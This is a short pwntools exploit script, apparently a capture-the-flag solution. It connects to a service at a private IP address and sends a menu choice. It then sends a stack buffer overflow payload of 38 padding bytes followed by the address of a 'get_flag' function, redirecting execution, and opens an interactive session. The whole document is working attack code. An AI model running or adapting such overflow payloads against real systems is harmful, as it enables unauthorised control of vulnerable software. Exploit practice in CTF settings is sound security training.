from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

r = remote('192.168.43.40','2222')

junk = "A"*38
get_flag = 0x565556b0

r.recvrepeat(0.2)

r.sendline("1")
log.info("Sent 1")

r.sendline(junk+p32(get_flag))
log.info("Sent payload")

r.interactive()
